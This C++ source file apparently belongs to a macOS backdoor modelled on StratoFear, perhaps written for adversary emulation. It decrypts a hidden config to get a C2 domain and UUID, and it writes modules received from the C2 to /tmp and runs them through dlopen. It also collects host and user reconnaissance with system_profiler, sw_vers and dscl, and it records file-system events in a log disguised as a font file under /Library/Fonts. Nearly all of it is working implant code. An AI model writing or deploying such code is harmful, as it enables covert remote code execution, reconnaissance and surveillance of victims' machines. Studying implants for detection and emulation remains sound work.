#include "core.hpp"

// Configuration file name passed through build
std::string CONFIG_PATH = CONFIG_PATH_ENV;
std::string CONFIG_FILENAME = CONFIG_FILENAME_ENV;


// decrypt network configuration file using openssl enc and system () command to decrypt the configuration file
bool _decryptConfig(){
    int result;
    XorLogger::LogDebug("decryptConfig() Decrypting " + CONFIG_FILENAME + " using openssl enc via system()");
    std::string pathToEncryptedConfig = CONFIG_PATH + CONFIG_FILENAME;
    std:: string command = "openssl enc -d -aes-128-cbc -pass pass:badapples -in " + pathToEncryptedConfig + " -out " + pathToEncryptedConfig + ".lock";
    
    // Run system() command to decrypt file
    result = std::system(command.c_str());
    
    return result == 0;
}

// Parses the network configuration file and saves the domain, UUID, & version to a struct
Configuration _pullConfigInfo(){
    std::string filePathDecrypted = CONFIG_PATH + CONFIG_FILENAME + ".lock";
    Configuration stratofearConfig;

    if (std::filesystem::exists(filePathDecrypted)){
        std::fstream file;
        file.open(filePathDecrypted, std::fstream::in | std::fstream::out | std::fstream::binary);
        file.seekg(410, std::ios::beg);
        file.read(stratofearConfig.UUID, sizeof(stratofearConfig.UUID));
        file.seekp(416, std::ios::beg);
        file.read(stratofearConfig.version, sizeof(stratofearConfig.version));
        file.seekp(526, std::ios::beg);
        std::string line;
        while (getline(file, line)){
            stratofearConfig.domain = line;
        }
        file.close();
        return stratofearConfig;
    }
    XorLogger::LogError("pullConfigInfo()" + filePathDecrypted + " does not exist!");
    return stratofearConfig;
}

Configuration LoadConfig(){

    Configuration stratofearConfig;
    std::string path = CONFIG_PATH + CONFIG_FILENAME;

    if (!std::filesystem::exists(path)){
        XorLogger::LogError(path + " does not exist!");
        return stratofearConfig;
    }
    XorLogger::LogSuccess("Found " + path);
    
    // Decrypt the file using openssl enc
    if(!_decryptConfig()){
        XorLogger::LogError("LoadConfig() File FAILED to decrypt.");
        return stratofearConfig;
    }
    XorLogger::LogSuccess("LoadConfig() Decrypted file");
    
    // Pull out the domain, UUID, & version from the passed filename using the current working directory
    stratofearConfig =_pullConfigInfo();
    if (stratofearConfig.domain.empty() || stratofearConfig.UUID[0] == '\0'){
        std::string uuid(stratofearConfig.UUID);
        XorLogger::LogError("LoadConfig() Config FAILED to load UUID or domain.\nDomain: "+ stratofearConfig.domain+ "\nUUID: " + uuid);
        return stratofearConfig;
    }
    std::string uuid(stratofearConfig.UUID);
    stratofearConfig.configured = true;
    XorLogger::LogInfo("LoadConfig(): Domain: " + stratofearConfig.domain);
    XorLogger::LogInfo("LoadConfig(): uuid: " + uuid);

    return stratofearConfig;
}

std::string generateFilename() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 61);
    const std::string alphaNumeric = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    std::string filename;
    for (int i = 0; i < 6; ++i) {
        filename += alphaNumeric[dis(gen)];
    }
    filename += ".tmp";
    return filename;
}

// Converts the file bytes sent from the C2 as a file on disk in the /tmp folder
std::string createModuleFile(const std::vector<unsigned char>& moduleBytes){
    std::string filepath = "/tmp/";
    filepath += generateFilename();
    std::ofstream file(filepath, std::ios::out | std::ios::binary);
    if (!file.is_open()) {
        XorLogger::LogError("Failed to open file for writing.");
        return filepath;
    }
    file.write(reinterpret_cast<const char*>(moduleBytes.data()), moduleBytes.size());
    file.close();
    XorLogger::LogSuccess("Module written as: " + filepath);
    return filepath;
}

// Load & Execute Module
char* executeModule(std::string filepath){
    char* fail = "Fail";
    char* result;
    
    void* handle = dlopen(filepath.c_str(), RTLD_LAZY);
    if (handle == NULL) {
        XorLogger::LogError("Could not obtain a handle to the dylib");
        return fail;
    }
    func_ptr* Initialize = (func_ptr*)dlsym(handle, "Initialize");
    if (Initialize == NULL) {
        XorLogger::LogError("Could not find Initialize function");
        return fail;
    }
    result = Initialize();
    if (dlclose(handle) != 0) {
        XorLogger::LogError("Could close handle to the dylib");
        return fail;
    }
    char* heapCopy = strdup(result);
    return heapCopy;
}

std::string runCommand(const char* command) {
    std::string output;
    FILE* pipe = popen(command, "r");
    if (!pipe) {
        return "Failed to open pipe for command: " + std::string(command);
    }
    char buffer[128];
    while (!feof(pipe)) {
        if (fgets(buffer, 128, pipe) != nullptr)
            output += buffer;
    }
    pclose(pipe);
    return output;
}

std::string collectSystemInfo(){

    std::string systemInfo = "\nSystem Information\n";
    //Collect system name
    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    std::string hostnameString(hostname);
    systemInfo += "\nHostname: " + hostnameString +"\n";

    const char* commands[] = {
    // Current User
    "logname",
    // System's architecture
    "/usr/sbin/system_profiler SPHardwareDataType",
    // OS version & build
    "/usr/bin/sw_vers",
    // List of current users (non-services)
    "dscl . -list /Users | grep -v '^_'",
    };
    
    for (const auto& command : commands) {
        std::string commandString(command);
        systemInfo += "Command: " + commandString + "\n";
        systemInfo += runCommand(command) + "\n";
    }

    return systemInfo;
}

void _logDeviceEvent(const std::string& message) {
    std::ofstream logfile("/Library/Fonts/AppleSDGothicNeo.ttc.1", std::ios_base::app);
    if (logfile.is_open()) {
        time_t now = time(0);
        tm* ltm = localtime(&now);
        char timestamp[20];
        strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", ltm);
        
        logfile << "[" << timestamp << "] " << message << std::endl;
        logfile.close();
    } else {
        XorLogger::LogError("Failed to write to log file");
    }
}

void _callback(ConstFSEventStreamRef streamRef,
              void *clientCallBackInfo,
              size_t numEvents,
              void *eventPaths,
              const FSEventStreamEventFlags eventFlags[],
              const FSEventStreamEventId eventIds[]) {
    char **paths = (char **)eventPaths;
    
    for (int i=0; i<numEvents; i++) {
        std::string message = "Event: ";
        if (eventFlags[i] & kFSEventStreamEventFlagItemCreated)
            message += "Created " + std::string(paths[i]);
        if (eventFlags[i] & kFSEventStreamEventFlagItemRemoved)
            message += "Removed " + std::string(paths[i]);
        if (eventFlags[i] & kFSEventStreamEventFlagItemModified)
            message += "Modified " + std::string(paths[i]);
        if (eventFlags[i] & kFSEventStreamEventFlagItemRenamed)
            message += "Renamed " + std::string(paths[i]);
        
        _logDeviceEvent(message);
    }
}

void monitorDevices(const char* path){
    if (path == nullptr){
        XorLogger::LogError("Path passed to `monitorDevices` is null.");
        return;
    }

    CFStringRef pathPtr = CFStringCreateWithCString(NULL, path, kCFStringEncodingUTF8);
    if (pathPtr == nullptr){
        XorLogger::LogError("Failed to create CFString from CString: path is null.");
        return;
    }
    CFArrayRef pathsToWatch = CFArrayCreate(NULL, (const void **)&pathPtr, 1, NULL);
    if (pathsToWatch == nullptr) {
        XorLogger::LogError("Failed to create CFArrayRef for path to monitor.");
        CFRelease(pathPtr);
        return;
    }
    FSEventStreamContext context = {0, NULL, NULL, NULL, NULL};
    if (context.info != nullptr) {
        XorLogger::LogError("Failed to initialize FSEventStreamContext Context.");
        CFRelease(pathPtr);
        CFRelease(pathsToWatch);
        return;
    }
    FSEventStreamRef stream = FSEventStreamCreate(NULL,
                                 &_callback,
                                 &context,
                                 pathsToWatch,
                                 kFSEventStreamEventIdSinceNow,
                                 1.0,
                                 kFSEventStreamCreateFlagFileEvents);
    if (stream == NULL) {
        XorLogger::LogError("Failed to create FSEventStream for device monitoring");
        CFRelease(pathPtr);
        CFRelease(pathsToWatch);
        return;
    }
    FSEventStreamScheduleWithRunLoop(stream, CFRunLoopGetCurrent(), kCFRunLoopDefaultMode);
    if (!FSEventStreamStart(stream)) {
        XorLogger::LogError("Failed to start FSEventStream to monitor devices");
        CFRelease(pathPtr);
        CFRelease(pathsToWatch);
        FSEventStreamRelease(stream);
        return;
}
    FSEventStreamStart(stream);
    CFRunLoopRun();
}